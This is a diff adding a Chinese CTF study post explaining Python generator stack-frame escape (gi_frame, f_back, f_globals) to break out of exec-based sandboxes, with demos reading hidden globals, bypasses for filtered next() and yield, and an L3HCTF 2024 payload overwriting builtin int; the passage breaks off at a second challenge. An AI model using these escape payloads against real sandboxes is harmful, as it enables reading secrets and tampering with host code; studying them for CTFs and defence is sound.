@@ -1291,6 +1291,574 @@
       </categories>
   </entry>
   <entry>
+    <title>python栈帧逃逸</title>
+    <url>/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/</url>
+    <content><![CDATA[<h1 id="python栈帧逃逸"><a href="#python栈帧逃逸" class="headerlink" title="python栈帧逃逸"></a>python栈帧逃逸</h1><p>一个挺新的逃逸方式，最近比赛都在考，赶快学习。</p>
+<span id="more"></span>
+
+<h3 id="生成器（henerator）"><a href="#生成器（henerator）" class="headerlink" title="生成器（henerator）"></a>生成器（henerator）</h3><p>Python生成器是一个特殊的迭代器，可以逐个产生元素，而不是一次性产生所有元素。生成器的工作方式与迭代器相似，<strong>可以通过for循环或者<code>__next__()</code>方法（或者使用next()函数）逐个获取生成器中的元素。</strong></p>
+<p>生成器<strong>使用yield关键字来定义生成器函数</strong>。迭代器在执行的过程中，<u>遇到yield语句时</u>，函数执行过程会被暂停，此时会保留函数的状态，<u>并将yield 后面的表达式作为当前迭代的值返回</u>。当再次调用生成器时，生成器会从上次暂停的位置继续执行，直到遇到下一个yield语句。</p>
+<p>给一个例子看看：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    a=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:   <span class="comment">#注意这里有一个循环</span></span><br><span class="line">        <span class="keyword">yield</span> a</span><br><span class="line">        a+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">c=haha()</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment">#next()函数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(c))</span><br><span class="line"><span class="comment">#__next__()方法</span></span><br><span class="line"><span class="built_in">print</span>(c.__next__())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ha&#x27;</span>)</span><br><span class="line"><span class="comment">#for循环</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">next</span>(c))</span><br></pre></td></tr></table></figure>
+
+<p>输出结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;generator object haha at 0x000001618ED64940&gt;</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">ha</span><br><span class="line">&lt;generator object haha at 0x000001618ED64940&gt;</span><br><span class="line">3</span><br><span class="line">&lt;generator object haha at 0x000001618ED64940&gt;</span><br><span class="line">4</span><br><span class="line">&lt;generator object haha at 0x000001618ED64940&gt;</span><br><span class="line">5</span><br></pre></td></tr></table></figure>
+
+<p>根据这个结论可以基本了解工作过程，在调用这个生成器函数时，<strong>它会立即返回一个生成器对象，而不是执行函数体</strong>。然后再调用生成器对象的<code>__next__</code>方法或next()函数时，生成器会从上次暂停的位置即系执行，直到遇到下一个yield语句。</p>
+<p><strong>注意一个生成器里面可以有多个yield关键字</strong>，流程不变，但是如果生成器在反复执行的时候，如果找不到下一个yield，或引发StopIteration错误，测试代码如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    a=<span class="number">1</span></span><br><span class="line">    <span class="keyword">yield</span> a</span><br><span class="line">    a+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">yield</span> a</span><br><span class="line">    a+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">c=haha()</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(c))</span><br><span class="line"><span class="built_in">print</span>(c.__next__())</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">&lt;generator <span class="built_in">object</span> haha at <span class="number">0x00000261ABB64940</span>&gt;</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">&lt;generator <span class="built_in">object</span> haha at <span class="number">0x00000261ABB64940</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#但是此时只要多一个print(next(c))就会报错StopIteration</span></span><br></pre></td></tr></table></figure>
+
+<p>注意看注释部分，这里说明了返回对象没有限制，但是对于yield关键字使用next()时需要根据语法有限制。</p>
+<h3 id="生成器表达式"><a href="#生成器表达式" class="headerlink" title="生成器表达式"></a>生成器表达式</h3><p>生成器表达式允许你使用简洁的语法来定义生成器，而不必显式地编写一个函数。</p>
+<p>生成表达式的语法与列表推导式类似，但是使用圆括号而不是方括号，可以使用for循环遍历生成器对象，或者使用next()函数逐个获取生成器中的元素：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=(i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(a))</span><br><span class="line"><span class="built_in">print</span>(a.__next__())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ha&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">&lt;generator <span class="built_in">object</span> &lt;genexpr&gt; at <span class="number">0x0000020AA0D8D630</span>&gt;</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">ha</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="生成器的属性"><a href="#生成器的属性" class="headerlink" title="生成器的属性"></a>生成器的属性</h3><p><code>gi_code</code>：生成器对应的code对象。</p>
+<p><code>gi_frame</code>：生成器对应的frame（栈帧）对象</p>
+<p><code>gi_running</code>：生成器是否在执行。生成器函数在yield以后、执行yield的下一行代码前初遇frozen状态，此时这个属性的值为0。</p>
+<p><code>gi_frame.f_locals</code>：一个字典，包含生成器当前帧的本地变量。</p>
+<p><strong>这里的重点是<code>gi_frame</code> 属性</strong></p>
+<p><code>gi_frame</code>是一个与生成器和协程相关的属性。它指向生成器或协程当前执行的帧对象，如果这个生成器或者协程正在执行的话。帧对象表示代码执行的当前上下文，<strong>包含了局部遍历、执行的字节码指令等信息。</strong></p>
+<h3 id="生成器的执行原理"><a href="#生成器的执行原理" class="headerlink" title="生成器的执行原理"></a>生成器的执行原理</h3><p><strong>先简单了解堆栈：</strong></p>
+<p>都是内存管理方式，来看不同点</p>
+<ul>
+<li>堆是在程序运行时，申请某个大小的内存空间。堆的内存都是动态分配的，在访问时和一般内存的访问没有区别，用。</li>
+<li>栈遵循的原则就是后进先出，它在栈顶进行插入和删除操作。</li>
+</ul>
+<p>————————————————————————————<br>而对于生成器的执行原理，如下：<br>在每个代码块（模块、类、函数）运行的时候，Python解释器会先为其创建一个栈帧，同时与物理栈帧不同，python 解释器所创建的帧栈是在进程的堆区创建的，这样的话在帧栈就是被 python 解释器所控制，<strong>只要不主动释放，代码块的栈帧仍会存在，我们依然能够获取到已经执行完代码的帧栈</strong><br><img src="/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/image-20240605142732236.png" alt="image-20240605142732236"></p>
+<h3 id="栈帧（frame）"><a href="#栈帧（frame）" class="headerlink" title="栈帧（frame）"></a>栈帧（frame）</h3><p>在Python中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。<strong>每当Python解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息</strong>。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。</p>
+<p>栈帧的重要属性：<br><code>f_locals</code>：一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。</p>
+<p><code>f_globals</code>：包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。</p>
+<p><code>f_builtins</code>：表示当前帧的内置命名空间，包含了所有的内置变量和函数。</p>
+<p><code>f_code</code>：一个代码对象，包含了函数或方法的字节码指令、常量、变量名等信息。</p>
+<p><code>f_lasti</code>：整数，表示最后执行的字节码指令的索引。</p>
+<p><code>f_back</code>：调用栈的前一帧</p>
+<p>**这里介绍一下<code>f_code</code>**：</p>
+<p>（这个是我从题里面看到的，学一下）</p>
+<p>一个代码对象，<em>它包含了函数的字节码</em>、函数的全局和局部命名空间以及其他信息，对象具有以下属性：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">co_argcount: 函数的命名参数数量（不包括 *args 和 **kwargs）。</span><br><span class="line">co_nlocals: 函数中的局部变量数量。</span><br><span class="line">co_stacksize: 函数调用所需的栈空间。</span><br><span class="line">co_consts: 函数中使用的常量。</span><br><span class="line">co_names: 函数中使用的全局变量的名称。</span><br><span class="line">co_varnames: 函数中使用的局部变量的名称。</span><br><span class="line">co_filename: 函数定义所在的文件名。</span><br><span class="line">co_firstlineno: 函数定义的第一行所在的行号。</span><br><span class="line">co_flags: 与函数相关的标志，例如是否是生成器函数、是否接受任意数量的位置参数等等。</span><br><span class="line">co_code: 函数的字节码指令序列。</span><br></pre></td></tr></table></figure>
+
+<p>先看一下如下代码：</p>
+<p>比如我想打印一个对象的字节码，如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    flag=<span class="string">&quot;flag&#123;ajhduiahdu&#125;&quot;</span></span><br><span class="line">    flag=<span class="string">&quot;haha&quot;</span></span><br><span class="line"><span class="built_in">print</span>(dis.dis(haha)) <span class="comment">#这里打印字节码</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;flag&#123;ajhduiahdu&#125;&#x27;</span>)</span><br><span class="line">              <span class="number">2</span> STORE_FAST               <span class="number">0</span> (flag)</span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>           <span class="number">4</span> LOAD_CONST               <span class="number">2</span> (<span class="string">&#x27;haha&#x27;</span>)</span><br><span class="line">              <span class="number">6</span> STORE_FAST               <span class="number">0</span> (flag)</span><br><span class="line">              <span class="number">8</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">             <span class="number">10</span> RETURN_VALUE</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>
+
+<p>常见的字节码指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD_CONST：加载一个常量</span><br><span class="line">LOAD_FAST: 在局部作用域中(比如函数)加载一个当前作用域的局部变量</span><br><span class="line">LOAD_GLOBAL: 在局部作用域(比如函数)中加载一个全局变量或者内置变量</span><br><span class="line">LOAD_NAME: 在全局作用域中加载一个全局变量或者内置变量</span><br><span class="line">STORE_FAST: 在局部作用域中定义一个局部变量, 来建立和某个对象之间的映射关系</span><br><span class="line">STORE_GLOBAL: 在局部作用域中定义一个global关键字声明的全局变量, 来建立和某个对象之间的映射关系</span><br><span class="line">STORE_NAME: 在全局作用域中定义一个全局变量, 来建立和某个对象之间的映射关系</span><br></pre></td></tr></table></figure>
+
+<p>注意看这里的Output，flag的值是完整被打印出来的，</p>
+<p><strong>结合这个特点，在栈帧逃逸中我们可以尝试读取字节码来读取flag</strong>，就需要用到<code>co_consts</code>属性来读取。</p>
+<p>思路如上，具体操作可以看下面的CISCN的例题</p>
+<p><strong>获取到内置方法的格式可以如下：</strong></p>
+<p>从全局变量获取到了内置命名空间，注意在利用内置函数的时候一定要想到这个点，不一定可以用。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g=f()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_globals[<span class="string">&#x27;__builtins__&#x27;</span>]  <span class="comment">#这里获取到了内置命名空间，在这里就可以获取到内置函数</span></span><br><span class="line"></span><br><span class="line">(<span class="number">1</span>)如何获取，可以另外用一个变量来获取，再利用，如下：</span><br><span class="line"><span class="built_in">str</span>=d.<span class="built_in">str</span>  <span class="comment">#这样就可以直接利用str来替代内置函数str()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)那么如何更改内置函数，就像L3HCTF那道题payload，可以自己定义一个来更改后赋值即可。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>看了一下栈帧的属性，试一下<code>f_builtins</code>，如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g=f()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_builtins.<span class="built_in">str</span>  <span class="comment">#这里获取到了内置命名空间，在这里就可以获取到内置函数</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">Output：</span><br><span class="line">AttributeError: <span class="string">&#x27;dict&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>有点奇怪，问了一下，原因大概如下：</p>
+<ul>
+<li><p><code>f_globals</code>是一个字典，包含了当前帧的全局变量。我们可以通过键来访问这个字典中的元素。在上一个代码中，<code>c.f_globals[&#39;__builtins__&#39;]</code>访问的是全局变量的一部分<code>__builtins__</code>，它指向内置命名空间，这个命名空间本身可以是一个模块或者一个字典，这取决于它是在交互式解释器中使用还是在一个脚本中。在大多数情况下，<code>__builtins__</code>是一个模块对象，你可以直接通过属性访问方式获取内置函数，如<code>.str</code>。</p>
+</li>
+<li><p><code>f_builtins</code>属性通常是一个对应内置命名空间的字典。这意味着，尽管它包含了所有的内置对象，但你不能使用属性访问方式来获取它们，因为字典不支持通过属性来访问键值，而是应该使用字典的键来访问。因此，你不能写<code>c.f_builtins.str</code>来获取<code>str</code>函数，而应该写<code>c.f_builtins[&#39;str&#39;]</code>。</p>
+</li>
+</ul>
+<p>对于这里的理解可以尝试和ssti的继承链结合，这样就好理解了，所以我们这里需要改，如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">g=f()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_builtins[<span class="string">&#x27;str&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>成功获取到,由此可以进行后续操作</p>
+<h3 id="利用栈帧沙箱逃逸"><a href="#利用栈帧沙箱逃逸" class="headerlink" title="利用栈帧沙箱逃逸"></a>利用栈帧沙箱逃逸</h3><p>原理就是通过生成器的栈帧对象再来使用f_back来返回前一帧从而逃逸出去获取globals全部变量（builtins同理）。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    g = f()  #生成器</span></span><br><span class="line"><span class="string">    frame = next(g) #获取到生成器的栈帧对象</span></span><br><span class="line"><span class="string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #返回并获取前一级栈帧的globals</span></span><br><span class="line"><span class="string">    return b</span></span><br><span class="line"><span class="string">b=waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span>=&#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code,<span class="built_in">locals</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>此时可以得到全局变量<code>secret</code>的值，</p>
+<p><strong>解读一下</strong></p>
+<p>看了这个示例代码后，思考了一下流程，我改了一下，用如下测试代码看这是如何进行换帧的：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g = f()  <span class="comment">#生成器</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(g)</span><br><span class="line">frame = <span class="built_in">next</span>(g) <span class="comment">#获取到生成器的栈帧对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line">f = frame.f_globals[<span class="string">&#x27;s3cret&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;3:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> f at <span class="number">0x00000247258E87D0</span>&gt;</span><br><span class="line"><span class="number">2</span>:</span><br><span class="line">&lt;frame at <span class="number">0x0000024725B08AE0</span>, file <span class="string">&#x27;D:\\clx\\ceshi.py&#x27;</span>, line <span class="number">13</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">3</span>:</span><br><span class="line">this <span class="keyword">is</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然后再改一点点：</span><br><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g = f()  <span class="comment">#生成器</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(g)</span><br><span class="line">frame = <span class="built_in">next</span>(g) <span class="comment">#获取到生成器的栈帧对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line">f = frame.f_back  <span class="comment">#只有这里被改了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;3:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">Output：</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> f at <span class="number">0x000001DD5A3689E0</span>&gt;</span><br><span class="line"><span class="number">2</span>:</span><br><span class="line">&lt;frame at <span class="number">0x000001DD5A4D8AE0</span>, file <span class="string">&#x27;D:\\clx\\venv\\haha.py&#x27;</span>, line <span class="number">12</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">3</span>:</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>
+
+<p>稍微说明一下（个人理解）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1对应 def f():</span><br><span class="line">    这一部分</span><br><span class="line">    </span><br><span class="line">2就已经通过f()函数里面的f_back进入到了全局变量这一帧</span><br><span class="line">3就可以获得全局变量了。</span><br></pre></td></tr></table></figure>
+
+<p>这里注意：看两个代码代码在3的区别，结合第二串代码如果在改的那里改为<code>frame.f_back.f_back</code>会报错，</p>
+<p><strong>可以得出一个结论</strong>：当使用最后一个<code>f_back</code>输出为None时，此时就这个帧已经对应到全局帧，可以直接利用。</p>
+<p><strong>现在来解析一下之前给的示例</strong>，按照我原先的理解，我会认为<code>f_back</code>会多一个，一直想不清楚。向baicany大哥请教了一下，悟了：</p>
+<p><strong>这个<code>exec</code>在执行时会创建一个环境，所以还需要在调用一个<code>f_back</code>逃逸从而去到全局那一帧。</strong></p>
+<p>我们来改一下代码看结果：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def f():</span></span><br><span class="line"><span class="string">    yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">g = f()  #生成器</span></span><br><span class="line"><span class="string">print(&#x27;1:&#x27;)</span></span><br><span class="line"><span class="string">print(g)</span></span><br><span class="line"><span class="string">frame = next(g) #获取到生成器的栈帧对象</span></span><br><span class="line"><span class="string">print(&#x27;2:&#x27;)</span></span><br><span class="line"><span class="string">print(frame)</span></span><br><span class="line"><span class="string">f = frame.f_back</span></span><br><span class="line"><span class="string">print(&#x27;3:&#x27;)</span></span><br><span class="line"><span class="string">print(f)</span></span><br><span class="line"><span class="string">d=f.f_globals[&#x27;s3cret&#x27;]</span></span><br><span class="line"><span class="string">print(&#x27;4:&#x27;)</span></span><br><span class="line"><span class="string">print(d)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">exec</span>(codes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output：</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> f at <span class="number">0x000001DE562387D0</span>&gt;</span><br><span class="line"><span class="number">2</span>:</span><br><span class="line">&lt;frame at <span class="number">0x000001DE56409760</span>, file <span class="string">&#x27;&lt;string&gt;&#x27;</span>, line <span class="number">10</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">3</span>:</span><br><span class="line">&lt;frame at <span class="number">0x000001DE56409800</span>, file <span class="string">&#x27;D:\\clx\\venv\\haha.py&#x27;</span>, line <span class="number">21</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">4</span>:</span><br><span class="line">this <span class="keyword">is</span> flag</span><br></pre></td></tr></table></figure>
+
+<p>看结果，可以看出成功出来了，www，本来想到是函数问题了，但在示例中最后那里调用了几个函数我就把这个问题排除了，<strong>exec()特殊</strong>！！！</p>
+<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><h5 id="过滤函数next"><a href="#过滤函数next" class="headerlink" title="过滤函数next()"></a>过滤函数next()</h5><p>即命名空间这样设置：<code>&#123;&#39;__builtins__&#39;: None&#125;</code>，这就导致了内置函数<code>next()</code>不能使用</p>
+<p><strong>（1）</strong>可以使用for循环,这里是采用的列表推导式，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">next(g) ==&gt; [x for x in g][0]</span><br></pre></td></tr></table></figure>
+
+<p>但是注意，这里使用for循环来获取生成器对象会增加一个栈帧，所以需要再加一个<code>f_back</code>。</p>
+<p><strong>（2）<code>send()</code>函数</strong></p>
+<p>可以通过send()给生成器传递数据，调用<code>send()</code>后，就不用再调用了<code>next()</code>了。</p>
+<p>直接给测试代码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g = f()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(g)</span><br><span class="line">frame = g.send(<span class="literal">None</span>)</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">    <span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> f at <span class="number">0x000001F30C930E40</span>&gt;</span><br><span class="line">&lt;frame at <span class="number">0x000001F30C527800</span>, file <span class="string">&#x27;D:\\clx\\venv\\haha.py&#x27;</span>, line <span class="number">8</span>, code &lt;module&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到已经逃逸到了全局空间。这里就是需要注意调用<code>send()</code>函数的格式和函数参数</p>
+<h5 id="过滤yield-关键字"><a href="#过滤yield-关键字" class="headerlink" title="过滤yield 关键字"></a>过滤yield 关键字</h5><p>正好前面提到了变形的列表推导式也可以当做yield关键字来定义生成器，如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=(a.gi_frame.f_back.f_back <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">这两个相当于</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>:</span><br><span class="line">    <span class="keyword">yield</span> </span><br><span class="line">g=a()</span><br></pre></td></tr></table></figure>
+
+<p>给个代码来对比一下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">a=(a.gi_frame.f_back <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">frame = <span class="built_in">next</span>(a) <span class="comment">#获取到生成器的栈帧对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line">d=frame.f_globals[<span class="string">&#x27;s3cret&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;3:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> &lt;genexpr&gt; at <span class="number">0x0000022469D6D630</span>&gt;</span><br><span class="line"><span class="number">2</span>:</span><br><span class="line">&lt;frame at <span class="number">0x0000022469CC8B40</span>, file <span class="string">&#x27;D:\\clx\\venv\\haha.py&#x27;</span>, line <span class="number">8</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">3</span>:</span><br><span class="line">this <span class="keyword">is</span> flag</span><br></pre></td></tr></table></figure>
+
+<p><code>[1]</code>可以换成<code>range(1)</code>，同样绕过方法可以组合起来用，注意<code>f_back</code>个数即可。</p>
+<h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><h5 id="L3HCTF-2024-intractable-problem-revenge"><a href="#L3HCTF-2024-intractable-problem-revenge" class="headerlink" title="L3HCTF 2024 -intractable problem revenge"></a>L3HCTF 2024 -intractable problem revenge</h5><p>暂时没找到复现环境，payload：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">factorization</span>(<span class="params">n</span>):</span><br><span class="line">    a=(a.gi_frame.f_back.f_back <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    a=[x <span class="keyword">for</span> x <span class="keyword">in</span> a][<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">globals</span>=a.f_back.f_back.f_globals</span><br><span class="line">    builtin = <span class="built_in">globals</span>[<span class="string">&quot;_&quot;</span> + <span class="string">&quot;_builtins_&quot;</span> + <span class="string">&quot;_&quot;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fakeint</span>(<span class="params">i</span>):</span><br><span class="line">        <span class="keyword">if</span>(builtin.<span class="built_in">len</span>(i)&gt;<span class="number">100</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">123123</span>*<span class="number">123123</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">123123</span></span><br><span class="line"></span><br><span class="line">    builtin.<span class="built_in">int</span>=fakeint</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>简单看了一下，逃逸过后进入到全局变量来改函数</p>
+<p>L3HCTF官方wp：<code>https://hust-l3hsec.feishu.cn/docx/MZ8SdwSoPo3cBTxOxbGcuUBun4c</code></p>
+<h5 id="第九届中国海洋大学-菜狗工具-2"><a href="#第九届中国海洋大学-菜狗工具-2" class="headerlink" title="第九届中国海洋大学-菜狗工具#2"></a>第九届中国海洋大学-菜狗工具#2</h5><p>题目描述：小王经过上次的惨痛教训后深刻反思，得出了解决不了 flag 泄露就解决 flag 本身的办法 这次你能拿到 flag 吗？</p>
+<p>——————————————</p>
+<p>附件内容：</p>
